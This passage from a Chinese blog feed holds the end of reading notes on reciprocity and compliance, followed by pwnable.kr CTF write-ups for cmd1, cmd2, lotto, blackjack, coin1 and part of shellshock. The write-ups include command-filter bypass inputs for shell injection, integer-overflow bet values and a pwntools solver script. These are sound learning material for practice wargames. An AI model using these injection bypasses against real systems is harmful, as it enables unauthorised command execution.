古德纳断言：在这个世界上几乎找不到一个不认同这条原理的社会组织。</p><p>正是因为这种的偿还机制，才有了劳动的分工，不同商品的交换以及不同服务的交换，同时也使得许多互相的个体结成了一个高效的社会单元。</p><p>人类社会从互惠原理中获得了重要的竞争优势，因此他们会训练其社会成员使他们笃信并顺从这个原理。我们每个人都被告知要遵守这一原理，并且我们每个人都知道，遵循这个原理就会得到社会的认可，否则就会被贴上招摇撞骗、忘恩负义、背信弃义之类的标签，因为人们对那些只知索取，不知回报的人普遍会产生一种厌恶感。</p><h2 id="利用互惠原理"><a href="#利用互惠原理" class="headerlink" title="利用互惠原理"></a>利用互惠原理</h2><p>互惠原理是如此好用，以至于各种地方都能看到它的身影，从免费试吃到送花捐款，具体的案例这里就不举了。简而言之，我们需要警惕互惠原理导致的<strong>不想要的交换</strong>与<strong>不公平的交换</strong>，原因是这个原理会导致多余的负债感。</p><h2 id="互惠原理的妙用——相互退让"><a href="#互惠原理的妙用——相互退让" class="headerlink" title="互惠原理的妙用——相互退让"></a>互惠原理的妙用——相互退让</h2><p>互惠原理说的是如果一个人对我们采取了某种行为，我们应该以类似的行为去回报。它产生的一个结果就是，别人退让了，我们也应该接着退让。</p><p>是的，这之中隐藏着一个很大的漏洞，退让未必就做出了真正的牺牲。这种简单的技巧，我们称之为<strong>拒绝—退让</strong>策略。</p><p>假设你想让我答应你的请求，你可以先提出一个比较大的，极有可能被我拒绝的请求，然后，当我拒绝了这个请求之后，你再提出一个小一些的，你真正感兴趣的请求。如果你能很有技巧地提出第二个请求，就会让我认为这第二个请求是你做出的一个让步，因而让我觉得自己也有义务做出相应的让步。我现在就有这样一个机会，即同意你的第一个请求。</p><p>但是需要注意的是，虽然我表现出的让步越大，就越容易让你觉得自己应该让步，但是如果最初提出的请求太极端，这个策略就会产生相反的效果，因为这种情况下，最初提出极端要求的一方会被对方认为是没有诚意，这样，以后的退让也不会被看作是真诚的让步，因此也就不能令对方妥协了。</p><h2 id="怎样保护自己"><a href="#怎样保护自己" class="headerlink" title="怎样保护自己"></a>怎样保护自己</h2><p>我们很难分辨出别人给予的恩惠是出于真心还是别有用心，因此，我们没办法运用单一的策略来对抗这个原理。</p><p>我们可以这样，如果他人最初给我们的恩惠是我们想要的，那就接受它，但我们接受的只是这个恩惠本身，而不是它背后所代表的东西。如果一个人给了我们一个好处，我们不妨接受它，同时意识到我们将来有责任去报答他。</p><p>但是，如果最初的好处原来不过只是一个机关、一个计谋、一个设计好的刺激我们报以更大好处的手段，那情况就不一样了。这种情况下，与我们打交道的并不是一个施恩者，而是一个牟利者，最初给我们的也就不是恩惠，而是一种迫使我们顺从的手段，只要我们认识到这点，那么互惠原理就不再是对方的同盟军了，互惠原理说的可不是诡计也必须用恩惠来报答。</p><p>以直报怨，以德报德。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
            <tag> 影响力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr-cmd1和cmd2-命令绕过</title>
      <link href="2021/04/25/pwnable-kr-cmd1%E5%92%8Ccmd2-%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87/"/>
      <url>2021/04/25/pwnable-kr-cmd1%E5%92%8Ccmd2-%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line"><span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">system( argv[<span class="number">1</span>] );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序很短，首先重写了PATH变量，然后对我们的参数进行检测，通过即可执行</p><p>需要注意的是重写变量后我们执行命令需要直接执行文件，例如不能直接 cat，需要/bin/cat</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>那我们只需要绕过过滤就可以了，例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cmd1 &quot;&#x2F;bin&#x2F;cat f*&quot;</span><br></pre></td></tr></table></figure><h1 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>** p;</span><br><span class="line"><span class="keyword">for</span>(p=environ; *p; p++)<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">delete_env();</span><br><span class="line">putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line"><span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">system( argv[<span class="number">1</span>] );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把系统变量全清了，同时加了一堆过滤，思考了半天没找着办法，主要是把/给过滤了，网上一搜发现骚操作还不少</p><ul><li>进入根目录，用$(pwd)来代替/</li><li>使用ascii码<code>\\57</code>来代替</li><li>使用<code>command -p</code>来绕过</li></ul><blockquote><p>command -p 使用 PATH 环境变量的缺省值执行命令搜索；查找所有命令<br>PATH缺省值：export PATH=/usr/local/sbin/:/usr/local/bin:/sbin:/bin:/usr/bin:/root/bin</p></blockquote><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-cmd2-1.png"  alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr-lotto-ascii</title>
      <link href="2021/04/25/pwnable-kr-lotto-ascii/"/>
      <url>2021/04/25/pwnable-kr-lotto-ascii/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = <span class="built_in">read</span>(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">read</span>(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win!</span></span><br><span class="line"><span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// menu</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(menu)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">play();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">help();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我开始以为是open文件的问题，看着不像随机，但是去弄了一下文件发现里面全是乱七八糟的玩意，然后再看看循环，发现有两个嵌套循环，那么，其实只要六个随机数我们蒙对一个，就赢了，而数的标准是ascii值1-45，其实概率还是蛮大的</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>我直接手动爆破</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-lotto-1.png"  alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr-blackjack-整数溢出</title>
      <link href="2021/04/25/pwnable-kr-blackjack-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>2021/04/25/pwnable-kr-blackjack-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目让我玩21点，连进去后可以查看规则或是开始</p><p>我们开始后让我们选择押注金额，发现开始只有500块，而要赢一百万才能有奖励</p><p>这我熟，我先来一个600块，发现押注金额并不能超过我的钱，那我直接开始溢出</p><p>先输入一个 4294967280 ，果然可以输入，并且输掉后我的钱增加了16块</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>那我直接再来一把，输入 4293967280，输掉后成功成为了百万富翁（狗头</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-blackjack-1.png"  alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr-coin1-二分法</title>
      <link href="2021/04/25/pwnable-kr-coin1-%E4%BA%8C%E5%88%86%E6%B3%95/"/>
      <url>2021/04/25/pwnable-kr-coin1-%E4%BA%8C%E5%88%86%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>连上去发现是玩一个找假币的游戏，真币重10，假币重9，可以使用天平秤重，会随机给出币的数量与可以称重的次数，次数用完后输入假币的编号即可，值得注意的是编号是从0开始的，需要进行100次，然后只有60s的时间，所以我们必须使用脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- Example -</span><br><span class="line">[Server] N&#x3D;4 C&#x3D;2 # find counterfeit among 4 coins with 2 trial</span><br><span class="line">[Client] 0 1 # weigh first and second coin</span><br><span class="line">[Server] 20# scale result : 20</span><br><span class="line">[Client] 3# weigh fourth coin</span><br><span class="line">[Server] 10# scale result : 10</span><br><span class="line">[Client] 2 # counterfeit coin is third!</span><br><span class="line">[Server] Correct!</span><br></pre></td></tr></table></figure><p>解题思路很容易想到二分法，我们只要挨个平分称重就可以定位出硬币了</p><p>不过由于网络延迟的原因，题目提示我们可以通过其他题目连上去，然后在本地弄</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(start, end)</span>:</span></span><br><span class="line"><span class="keyword">global</span> p,c</span><br><span class="line">mid = (start + end) // <span class="number">2</span></span><br><span class="line">full = (end - start) // <span class="number">2</span> * <span class="number">10</span></span><br><span class="line">s = str.encode(<span class="string">' '</span>.join(map(<span class="keyword">lambda</span> x: str(x), range(start, mid))))</span><br><span class="line">p.sendline(s)</span><br><span class="line">r = p.recvline()</span><br><span class="line">real = int(r)</span><br><span class="line">c -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> c &gt;= <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> real &lt; full:</span><br><span class="line"><span class="keyword">return</span> start <span class="keyword">if</span> mid - start == <span class="number">1</span> <span class="keyword">else</span> solve(start, mid)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> mid <span class="keyword">if</span> end - mid == <span class="number">1</span> <span class="keyword">else</span> solve(mid, end)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> p,c</span><br><span class="line">r = str(p.recv())</span><br><span class="line">pattern = re.compile(<span class="string">r'N=(\d+) C=(\d+)'</span>)</span><br><span class="line">n,c = list(map(<span class="keyword">lambda</span> x: int(x),pattern.match(r).groups()))</span><br><span class="line">result = solve(<span class="number">0</span>,n)</span><br><span class="line"><span class="keyword">while</span> c&gt;=<span class="number">0</span>:</span><br><span class="line">p.sendline(str(result))</span><br><span class="line">r = p.recvline()</span><br><span class="line">c -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9007</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Ready? starting in 3 sec... -\n\t\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">print(<span class="string">"round &#123;&#125;"</span>.format(i))</span><br><span class="line">worker()</span><br><span class="line">flag = p.recv()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>发现其实已经有不少了，所以参考着写了一份</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-coin1-1.png"  alt=""></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr-shellshock-组文件与bash漏洞</title>
      <link href="2021/04/24/pwnable-kr-shellshock-%E7%BB%84%E6%96%87%E4%BB%B6%E4%B8%8Ebash%E6%BC%8F%E6%B4%9E/"/>
      <url>2021/04/24/pwnable-kr-shellshock-%E7%BB%84%E6%96%87%E4%BB%B6%E4%B8%8Ebash%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目说是和bash相关，那我们直接先连进去</p><p>打开一看是非常短小的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">setresuid(getegid(), getegid(), getegid());</span><br><span class="line">setresgid(getegid(), getegid(), getegid());</span><br><span class="line">system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至少我没办法立刻看懂这都在干啥</p><h2 id="可能需要的linux知识"><a href="#可能需要的linux知识" class="headerlink" title="可能需要的linux知识"></a>可能需要的linux知识</h2><p>在Linux上，每个进程都有以下用户和组标识符：</p><ul><li>真实用户ID和真实组ID。这些ID确定谁是进程的所有者。</li><li>有效的用户ID和有效的组ID。内核使用这些ID来确定进程在访问共享资源（例如消息队列，共享内存和信号灯）时将具有的权限。在大多数UNIX系统上，这些ID还会确定访问文件时的权限。但是，Linux使用文件系统ID来完成此任务。</li><li>已保存的设置用户ID和已保存的设置组ID。这些ID在设置用户ID和设置组ID程序中使用，以保存执行程序时设置的相应有效ID的副本。设置用户ID程序可以通过在其实际用户ID和已保存的设置用户ID的值之间来回切换其有效用户ID来获得和放弃特权。</li></ul><p><a href="https://blog.csdn.net/qq_33883085/article/details/88799925" target="_blank" rel="noopener">getuid、geteuid、getgid和getegid函数</a></p><p><a href="https://man.archlinux.org/man/setresgid.2.en" target="_blank" rel="noopener">setresuid, setresgid</a></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>其实我感觉上面还是没说人话，但是我也没能找着说人话的解释，我参考的wp上是这么说的</p><blockquote><p>这段程序很简单，我们以shellshock身份启动时，程序的权限是other权限r-x，而在setresuid和setresgid中使用的是effective gid，也就是shellshock_pwn的权限r-s，当程序执行到system时，程序已经具有shellshock_pwn组权限了。</p></blockquote><p>各文件权限是这样的</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnable.kr-shellshock-1.png"  alt=""></p><p>那么我们其实已经获得了flag的读权限，但是函数语句中并没有对flag的读取，只有一个使用bash操作，那么这下怎么办呢？</p><p>题目的提示在于题目名：shallchock，这是关于bash的一个本地提权漏洞，原理可以参考</p><ul><li><a href="https://blog.csdn.net/pygain/article/details/53969081" target="_blank" rel="noopener">关于ShellShock漏洞的利用过程和原理解析</a></li><li><a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html" target="_blank" rel="noopener">Shellshock漏洞回顾与分析测试</a></li></ul><h3 